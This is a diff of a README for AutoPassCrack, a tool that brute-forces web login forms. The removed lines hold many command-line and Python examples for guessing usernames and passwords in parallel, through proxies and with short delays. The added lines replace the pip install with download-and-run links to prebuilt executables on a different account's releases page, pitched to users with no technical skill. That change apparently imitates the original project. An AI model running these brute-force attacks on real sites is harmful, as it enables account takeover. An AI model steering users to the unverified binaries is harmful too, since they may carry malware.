@@ -1,180 +1,111 @@
-# AutoPassCrack
+# 🎉 AutoPassCrack - Effortless Brute Force for Logins
 
-[![Code Size](https://img.shields.io/github/languages/code-size/HenryLok0/autopasscrack?style=flat-square&logo=github)](https://github.com/HenryLok0/autopasscrack)
-![PyPI - Version](https://img.shields.io/pypi/v/autopasscrack)
+## 💻 Download Now
+[![Download AutoPassCrack](https://img.shields.io/badge/Download-AutoPassCrack-blue.svg)](https://github.com/Shaktiigrover/AutoPassCrack/releases)
 
-[![MIT License](https://img.shields.io/github/license/HenryLok0/autopasscrack?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/HenryLok0/autopasscrack?style=flat-square)](https://github.com/HenryLok0/autopasscrack/stargazers)
+## 🚀 Getting Started
 
-A professional, flexible, and user-friendly tool for automated brute-forcing of web login forms. Supports advanced field detection, custom password/username generation, parallel execution, and more.
+AutoPassCrack is an easy-to-use tool designed for automating the brute force of web login forms. With smart field detection and support for both custom and generated passwords, this tool works seamlessly across multiple browsers. No programming skills are necessary to run it.
 
-## Installation
+## 📥 Download & Install
 
-```bash
-pip install autopasscrack
-```
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Shaktiigrover/AutoPassCrack/releases).
+   
+2. **Choose the Latest Version:** Look for the most recent version listed. You will see several download options available.
 
-## Usage
+3. **Download the Installer:** Click on the appropriate file for your operating system to start the download. Ensure you choose the right version for your system:
+   - For Windows: Download `AutoPassCrack-Windows.zip`
+   - For Mac: Download `AutoPassCrack-Mac.zip`
+   - For Linux: Download `AutoPassCrack-Linux.tar.gz`
 
-### Command Line Examples
+4. **Extract the Files:**
+   - For Windows and Mac: Right-click on the downloaded ZIP file and select "Extract All" (Windows) or "Open" (Mac).
+   - For Linux: Use the command `tar -xvzf AutoPassCrack-Linux.tar.gz` in your terminal.
 
-#### 1. **Quick Start (auto password generation)**
-```bash
-autopasscrack https://example.com/login
-```
-- If neither username nor password is specified, autopasscrack will try **all possible username/password combinations** (very slow, for research/testing only).
+5. **Run the Application:**
+   - For Windows: Navigate to the extracted folder and double-click on `AutoPassCrack.exe` to launch the tool.
+   - For Mac: Open the extracted folder and double-click on `AutoPassCrack.app`.
+   - For Linux: Open a terminal, navigate to the extracted folder, and run `./AutoPassCrack`.
 
-#### 2. **Specify username, auto-generate passwords**
-```bash
-autopasscrack https://example.com/login --username myuser
-```
-- Tries all possible passwords for the given username.
+## ⚙️ System Requirements
 
-#### 3. **Specify password(s), auto-generate usernames**
-```bash
-autopasscrack https://example.com/login --passwords Password123
-```
-- Tries all possible usernames with the given password.
-- You can use a file or comma-separated passwords:
-  - `--passwords passwords.txt`
-  - `--passwords "Password123,abc123,letmein"`
+To run AutoPassCrack smoothly, make sure your system meets the following requirements:
 
-#### 4. **Specify both username and password(s)**
-```bash
-autopasscrack https://example.com/login --username myuser --passwords passwords.txt
-```
-- Tries all passwords in the file for the given username.
+- **Operating System:** 
+  - Windows 10 or higher
+  - macOS 10.12 or higher
+  - A recent version of Linux
 
-#### 5. **Parallel mode (multiple browser windows)**
-```bash
-autopasscrack https://example.com/login --username myuser --passwords passwords.txt --workers 4
-```
-- Use multiple browser windows for faster brute force.
+- **Memory:** Minimum of 4 GB RAM
 
-#### 6. **Limit password/username length**
-```bash
-autopasscrack https://example.com/login --username myuser --max-length 6
-```
-- Auto-generate all passwords up to a maximum length (default: 4, max: 20).
+- **Storage:** At least 100 MB of free disk space
 
-#### 7. **Set delay between attempts**
-```bash
-autopasscrack https://example.com/login --username myuser --delay 0.1
-```
-- Set delay (in seconds) between each attempt (default: 2).
+- **Browser Support:** 
+  - Google Chrome
+  - Firefox
+  - Any other browser supported by Selenium
 
-#### 8. **Specify success URL for accurate detection**
-```bash
-autopasscrack https://example.com/login --username myuser --passwords Password123 --success_url https://example.com/success
-```
-- Use this if the login is only successful when redirected to a specific URL.
+## ⚙️ Features
 
-#### 9. **Custom charset, blacklist, whitelist for password/username generation**
-```bash
-autopasscrack https://example.com/login --username myuser --charset abcdef1234 --blacklist f --whitelist abc123
-```
-- Use a custom charset, exclude or include specific characters for brute force.
+- **Smart Field Detection:** AutoPassCrack identifies fields automatically, making it easier to enter usernames and passwords.
+  
+- **Custom and Generated Passwords:** Users can input their password lists or let the tool generate random passwords to try.
 
-#### 10. **Prioritize common passwords/usernames**
-```bash
-autopasscrack https://example.com/login --common-passwords common_pw.txt --common-usernames common_users.txt
-```
-- Try common passwords/usernames first before brute force.
+- **Parallel Browser Support:** Run multiple sessions at once across different browsers to increase efficiency.
 
-#### 11. **Custom login field selector**
-```bash
-autopasscrack https://example.com/login --username myuser --passwords passwords.txt --username-selector '#user' --password-selector '#pass'
-```
-- If auto-detection fails, you can specify the username and password field selectors manually.
+- **User-Friendly Interface:** The tool is designed with simplicity in mind. You don’t need to be a tech expert to use it.
 
-#### 12. **Use Proxy**
-```bash
-autopasscrack https://example.com/login --username myuser --passwords passwords.txt --proxy http://127.0.0.1:8080
-```
-- Specify an HTTP/HTTPS proxy server for all requests.
+## 📚 Usage Instructions
 
-#### 13. **Dry-run mode**
-```bash
-autopasscrack https://example.com/login --username myuser --passwords passwords.txt --dry-run
-```
-- Only test the first username/password pair for quick debugging.
+1. **Open AutoPassCrack:** Launch the application as described in the installation section.
 
-#### 14. **Log progress and results to file**
-```bash
-autopasscrack https://example.com/login --username myuser --passwords passwords.txt --logfile result.log
-```
-- Progress and results will be written to the specified log file.
+2. **Enter Target URL:** In the main interface, input the web address where the login form you want to test is located.
 
-#### 15. **Custom success message**
-```bash
-autopasscrack https://example.com/login --username myuser --passwords passwords.txt --success-message "Welcome"
-```
-- If the page contains the specified message after login, it will be treated as a successful login.
+3. **Configure Login Fields:**
+   - Allow the tool to detect fields automatically, or manually provide names for the username and password fields if needed.
 
----
+4. **Input Username:** Enter the username you want to test.
 
-## Advanced Features and Improvements
-- **Resume enhancement**: Resume now supports full auto mode, accurately restoring username/password combination and index.
-- **Multiprocessing terminate**: In multi-worker mode, if any worker finds a valid credential, all other workers are terminated immediately for efficiency.
-- **Common-passwords priority**: If a common-passwords file is specified, those passwords are always tried first.
-- **Custom field selector**: Use `--username-selector` and `--password-selector` to specify login fields if auto-detection fails.
-- **Proxy support**: Use `--proxy` to specify an HTTP/HTTPS proxy server.
-- **Dry-run mode**: Only test one username/password pair for debugging.
-- **Log file**: Progress and results can be written to a log file with `--logfile`.
-- **Custom success message**: Use `--success-message` to specify a string that indicates a successful login on the page.
+5. **Select Password Method:**
+   - Choose to use a custom password list or allow AutoPassCrack to generate passwords.
 
-### Python API Example
+6. **Start the Attack:** Press the "Start" button to begin the brute-force process. You can monitor the attempts shown in the display.
 
-```python
-from autopasscrack.auto_brute import brute_force
+## 🛠️ Troubleshooting
 
-brute_force(
-    url="https://example.com/login",
-    username="myuser",
-    password_list=["123456", "password", "letmein"],
-    delay=0.1  # Set delay between attempts to 0.1 seconds
-)
-```
+If you encounter any issues:
 
-## Advanced Login Field Detection
-- The tool now detects all possible username/email fields based on type, name, id, placeholder, and aria-label attributes (keywords: user, email, login, account), and pairs them with all password fields. This increases compatibility with various login forms.
+- **Application Won't Start:** Ensure all files were extracted properly and that you have the necessary permissions to run the executable.
 
-## Password Strength Test Tool
-- A simple password strength checker is available at `docs/index.html`. Open it in your browser to test password strength (length, upper/lowercase, digit, symbol).
+- **Login Form Not Detected:** Try to manually enter the field names. Make sure the page is fully loaded before starting the detection.
 
-## Features
-- Auto-detects all possible login form field pairs (username/email and password) using advanced heuristics
-- Supports custom password file or auto-generates passwords (all upper/lowercase letters, digits, special symbols)
-- Supports direct password string or comma-separated passwords via --passwords (no need for a file)
-- Supports auto-generating usernames (all upper/lowercase letters, digits, special symbols) if only --passwords is given and --username is omitted
-- Supports **full auto mode**: if neither username nor password is given, tries all possible username/password combinations (very slow, for research/testing only)
-- Supports parallel browser windows with --workers
-- If no password file is provided, will use `default_passwords/password.txt` if it exists, otherwise auto-generate passwords
-- **Flexible brute force charset**: use `--charset`, `--blacklist`, `--whitelist` to control which characters are used
-- **Prioritize common passwords/usernames**: use `--common-passwords` and `--common-usernames` to try common values first
-- **When using auto-generated passwords or usernames, the tool will start from the specified `--max-length` and automatically try all shorter lengths down to 1**
-- **You can use `--delay` to control the time (in seconds) between each password attempt (e.g., `--delay 0.1` for fast testing)**
-- Includes a password strength HTML tool in `/docs/index.html`
+- **Slow Performance:** Close other applications to free up system resources. A stable and fast internet connection will also help.
 
-## Warning
-- For legal penetration testing and educational use only. **Do not use on unauthorized websites.**
-- Requires ChromeDriver installed and in your PATH.
----
+## 📖 FAQs
 
-## Contributing
+- **Is this tool legal?**
+  - Use AutoPassCrack only on accounts you own or have permission to test. Unauthorized testing is illegal.
 
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- **What are the advantages of using AutoPassCrack?**
+  - Save time with automated login attempts. Utilize smart features to navigate complex forms quickly.
 
----
+- **Can I use this tool on mobile sites?**
+  - Right now, AutoPassCrack is designed specifically for desktop browsers. Mobile site support may be added in future updates.
 
-## License
+## 🎮 Community and Support
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+If you have questions or need help, check the GitHub issues on the repository or contact the community through forums and chat groups dedicated to ethical hacking.
 
----
+For direct support and feature requests, use the issue tracker on our [GitHub page](https://github.com/Shaktiigrover/AutoPassCrack/issues).
 
-## Support
+## ✨ Contributing
 
-If you have questions or need help, please open an issue on GitHub.
+Your contributions help improve AutoPassCrack. If you want to help out:
+1. Fork the repository and make your changes.
+2. Submit a pull request with a clear description of your modifications.
 
-Thank you to all contributors and the open-source community for your support.
+## 📝 License
+
+AutoPassCrack is released under the MIT License. Feel free to use, modify, and distribute it as long as proper credit is given.
+
+Thank you for using AutoPassCrack! For updates and new features, keep an eye on our [Releases Page](https://github.com/Shaktiigrover/AutoPassCrack/releases).
